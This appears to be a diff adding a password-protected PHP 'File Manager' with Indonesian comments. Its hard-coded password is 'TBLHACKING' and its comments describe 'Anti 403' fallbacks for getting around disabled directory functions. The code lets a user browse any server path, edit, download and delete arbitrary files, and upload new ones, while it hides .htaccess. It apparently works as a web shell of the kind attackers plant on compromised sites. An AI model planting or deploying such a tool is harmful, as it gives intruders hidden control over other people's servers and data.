@@ -1,0 +1,262 @@
+<?php
+// Anti Blank: Menampilkan error secara transparan jika ada crash sistem
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+error_reporting(E_ALL);
+
+// ================= KONFIGURASI =================
+$PASSWORD = "TBLHACKING "; // Silakan ganti password ini
+// ===============================================
+
+session_start();
+if (isset($_GET['logout'])) {
+    unset($_SESSION['logged_in']);
+    header("Location: ?");
+    exit;
+}
+if (!isset($_SESSION['logged_in'])) {
+    if (isset($_POST['pass']) && $_POST['pass'] === $PASSWORD) {
+        $_SESSION['logged_in'] = true;
+        header("Location: ?");
+        exit;
+    }
+    echo '<style>body{background:#1a1c23;color:#fff;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}form{background:#222531;padding:25px;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,0.4)}input{display:block;margin:12px 0;padding:10px;width:210px;background:#2d3142;color:#fff;border:1px solid #4f5d75;border-radius:4px}input[type="submit"]{background:#ef8354;color:#fff;cursor:pointer;font-weight:bold;border:none}</style>';
+    echo '<form method="POST"><h3 style="margin-top:0;text-align:center;">File Manager</h3><input type="password" name="pass" placeholder="Password" required><input type="submit" value="Login"></form>';
+    exit;
+}
+
+// Anti 403 / Cegah Lock Path: Menentukan direktori aktif berdasarkan URL (?dir=...)
+$root = str_replace('\\', '/', getcwd());
+if (isset($_GET['dir']) && !empty($_GET['dir'])) {
+    // Sanitasi dan konversi path agar kompatibel dengan Linux/Windows Server
+    $clean_dir = str_replace('\\', '/', $_GET['dir']);
+    // Memastikan folder tersebut ada sebelum dipindahkan
+    if (@is_dir($clean_dir)) {
+        $dir = $clean_dir;
+    } else {
+        $dir = $root;
+    }
+} else {
+    $dir = $root;
+}
+
+// Coba terapkan perubahan direktori kerja di level server (Supaya fungsi upload/delete sinkron)
+@chdir($dir);
+
+// Fitur Download File Standard
+if (isset($_GET['download'])) {
+    $file = $_GET['download'];
+    if (file_exists($file) && is_file($file)) {
+        header('Content-Description: File Transfer');
+        header('Content-Type: application/octet-stream');
+        header('Content-Disposition: attachment; filename="'.basename($file).'"');
+        header('Content-Length: ' . filesize($file));
+        readfile($file);
+        exit;
+    }
+}
+
+// Fitur Hapus Item (File atau Folder Kosong)
+if (isset($_GET['delete'])) {
+    $target = $_GET['delete'];
+    if (is_file($target)) @unlink($target);
+    if (is_dir($target)) @rmdir($target);
+    header("Location: ?dir=" . urlencode($dir));
+    exit;
+}
+
+// Anti 403: Sistem 3 Lapis Pembaca Konten Folder
+function baca_isi_folder($dir) {
+    // Lapis 1: Gunakan scandir standard
+    if (function_exists('scandir')) {
+        $scan = @scandir($dir);
+        if ($scan !== false) return $scan;
+    }
+    // Lapis 2: Bypass menggunakan OpenDir / ReadDir pointer jika scandir di-disable
+    $files = [];
+    if ($handle = @opendir($dir)) {
+        while (false !== ($entry = readdir($handle))) { $files[] = $entry; }
+        closedir($handle);
+        return $files;
+    }
+    // Lapis 3: Menggunakan metode pencarian pola Glob sebagai alternatif terakhir
+    $glob = @glob($dir . '/*');
+    if($glob) {
+        foreach($glob as $g) { $files[] = basename($g); }
+    }
+    return $files;
+}
+
+$items = baca_isi_folder($dir);
+
+// Membaca file untuk Text Editor teks biasa
+$edit_content = ""; $edit_filename = "";
+if (isset($_GET['edit'])) {
+    $edit_filename = $_GET['edit'];
+    if (file_exists($edit_filename) && is_file($edit_filename)) {
+        $edit_content = htmlspecialchars(file_get_contents($edit_filename));
+    }
+}
+?>
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lightweight File Manager</title>
+    <style>
+        body { font-family: system-ui, -apple-system, sans-serif; background: #f4f5f7; margin: 0; padding: 20px; color: #333; }
+        .container { max-width: 1100px; margin: 0 auto; background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.06); }
+        .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #edf0f5; padding-bottom: 12px; margin-bottom: 15px; }
+        .path { font-weight: bold; color: #4a5568; background: #edf2f7; padding: 10px 15px; border-radius: 6px; word-break: break-all; font-family: monospace; }
+        .btn { padding: 7px 14px; background: #4f5d75; color: #fff; text-decoration: none; border-radius: 4px; font-size: 14px; cursor: pointer; border: none; display: inline-block;}
+        .btn-danger { background: #d9534f; }
+        .btn-success { background: #2ecc71; }
+        .layout { display: flex; flex-direction: column; gap: 15px; }
+        table { width: 100%; border-collapse: collapse; background: #fff; border-radius: 6px; overflow: hidden; }
+        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #edf0f5; }
+        th { background: #f8f9fa; color: #718096; font-size: 14px; }
+        tr:hover { background: #f8fafc; }
+        .toolbar { background: #f8f9fa; padding: 15px; border-radius: 6px; display: flex; gap: 12px; flex-wrap: wrap; align-items: center; border: 1px solid #e2e8f0; }
+        input[type="file"], input[type="text"], textarea { padding: 8px; border: 1px solid #cbd5e0; border-radius: 4px; background: #fff; color: #333; }
+        .editor-box { background: #fff; padding: 15px; border-radius: 6px; border: 1px solid #cbd5e0; margin-top: 15px; }
+        .editor-textarea { width: 100%; height: 350px; font-family: monospace; box-sizing: border-box; margin-bottom: 10px; font-size: 14px; padding: 10px; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="header">
+        <h2 style="margin:0; color:#2d3748;">📁 File Manager</h2>
+        <a href="?logout=1" class="btn btn-danger">Keluar</a>
+    </div>
+
+    <div class="path">Direktori: <?php echo $dir; ?></div>
+    <br>
+
+    <div class="layout">
+        <div class="toolbar">
+            <form method="POST" enctype="multipart/form-data" style="display:inline-flex; gap:5px;">
+                <input type="file" name="upload_file" required>
+                <input type="submit" name="do_upload" value="Upload File" class="btn btn-success">
+            </form>
+            
+            <form method="POST" style="display:inline-flex; gap:5px;">
+                <input type="text" name="item_name" placeholder="Nama Baru..." required>
+                <input type="submit" name="do_mkdir" value="+ Folder" class="btn">
+                <input type="submit" name="do_mkfile" value="+ File Baru" class="btn" style="background:#3182ce;">
+            </form>
+            
+            <?php
+            // Logika aksi form
+            if (isset($_POST['do_upload'])) {
+                if (@move_uploaded_file($_FILES['upload_file']['tmp_name'], $dir . '/' . basename($_FILES['upload_file']['name']))) {
+                    echo "<script>window.location='?dir=".urlencode($dir)."';</script>";
+                }
+            }
+            if (isset($_POST['do_mkdir'])) {
+                @mkdir($dir . '/' . $_POST['item_name'], 0755);
+                header("Location: ?dir=" . urlencode($dir));
+            }
+            if (isset($_POST['do_mkfile'])) {
+                @file_put_contents($dir . '/' . $_POST['item_name'], '');
+                header("Location: ?dir=" . urlencode($dir) . "&edit=" . urlencode($dir . '/' . $_POST['item_name']));
+            }
+            if (isset($_POST['save_file'])) {
+                @file_put_contents($_POST['target_file'], $_POST['file_content']);
+                echo "<script>alert('File berhasil disimpan!'); window.location='?dir=".urlencode($dir)."';</script>";
+            }
+            ?>
+        </div>
+
+        <?php if (isset($_GET['edit'])): ?>
+            <div class="editor-box">
+                <h3 style="margin-top:0;">📝 Mengedit File: <?php echo htmlspecialchars(basename($edit_filename)); ?></h3>
+                <form method="POST">
+                    <input type="hidden" name="target_file" value="<?php echo htmlspecialchars($edit_filename); ?>">
+                    <textarea class="editor-textarea" name="file_content"><?php echo $edit_content; ?></textarea>
+                    <div style="display:flex; gap:10px;">
+                        <input type="submit" name="save_file" value="Simpan Perubahan" class="btn btn-success">
+                        <a href="?dir=<?php echo urlencode($dir); ?>" class="btn" style="background:#718096;">Batal</a>
+                    </div>
+                </form>
+            </div>
+            <br>
+        <?php endif; ?>
+
+        <table>
+            <thead>
+                <tr>
+                    <th>Nama</th>
+                    <th>Ukuran</th>
+                    <th style="text-align:right;">Aksi</th>
+                </tr>
+            </thead>
+            <tbody>
+                <?php 
+                // Mengambil path satu tingkat di atas direktori saat ini
+                $posisi_slash = strrpos($dir, '/');
+                if ($posisi_slash !== false && $dir != $root):
+                    $parent = substr($dir, 0, $posisi_slash);
+                    if(empty($parent)) $parent = "/";
+                ?>
+                <tr>
+                    <td colspan="3">
+                        <a href="?dir=<?php echo urlencode($parent); ?>" style="text-decoration:none; color:#3182ce; font-weight:bold; font-size:15px;">↩️ .. (Kembali ke Folder Sebelumnya)</a>
+                    </td>
+                </tr>
+                <?php endif; ?>
+
+                <?php
+                if (!empty($items)) {
+                    // Kelompokkan folder di atas, file di bawah agar rapi
+                    $folders_list = [];
+                    $files_list = [];
+
+                    foreach ($items as $item) {
+                        if ($item == '.' || $item == '..') continue;
+                        if ($item == '.htaccess') continue; // Sembunyikan htaccess untuk menghindari crash internal server
+
+                        $full_path = $dir . '/' . $item;
+                        if (@is_dir($full_path)) {
+                            $folders_list[] = $item;
+                        } else {
+                            $files_list[] = $item;
+                        }
+                    }
+
+                    // Render Folder Dahulu
+                    foreach ($folders_list as $f) {
+                        $full_path = $dir . '/' . $f;
+                        echo "<tr>";
+                        echo "<td><a href='?dir=" . urlencode($full_path) . "' style='text-decoration:none; color:#dd6b20; font-weight:bold;'>📁 $f</a></td>";
+                        echo "<td>Folder</td>";
+                        echo "<td style='text-align:right;'><a href='?dir=" . urlencode($dir) . "&delete=" . urlencode($full_path) . "' class='btn btn-danger' style='padding:3px 8px; font-size:12px;' onclick='return confirm(\"Hapus folder ini?\")'>Hapus</a></td>";
+                        echo "</tr>";
+                    }
+
+                    // Render File Berikutnya
+                    foreach ($files_list as $f) {
+                        $full_path = $dir . '/' . $f;
+                        $size = round(@filesize($full_path) / 1024, 2) . ' KB';
+                        echo "<tr>";
+                        echo "<td>📄 $f</td>";
+                        echo "<td>$size</td>";
+                        echo "<td style='text-align:right;'>";
+                        echo "<a href='?dir=" . urlencode($dir) . "&edit=" . urlencode($full_path) . "' class='btn' style='padding:3px 8px; font-size:12px; background:#4a5568; margin-right:4px;'>Edit</a>";
+                        echo "<a href='?dir=" . urlencode($dir) . "&download=" . urlencode($full_path) . "' class='btn' style='padding:3px 8px; font-size:12px; background:#2ecc71; margin-right:4px;'>Unduh</a>";
+                        echo "<a href='?dir=" . urlencode($dir) . "&delete=" . urlencode($full_path) . "' class='btn btn-danger' style='padding:3px 8px; font-size:12px;' onclick='return confirm(\"Hapus file ini?\")'>Hapus</a>";
+                        echo "</td>";
+                        echo "</tr>";
+                    }
+                } else {
+                    echo "<tr><td colspan='3' style='text-align:center; color:#a0aec0; padding:30px 10px;'>Folder Ini Kosong / Akses Direktori Terkunci Server (403)</td></tr>";
+                }
+                ?>
+            </tbody>
+        </table>
+    </div>
+</div>
+
+</body>
+</html>
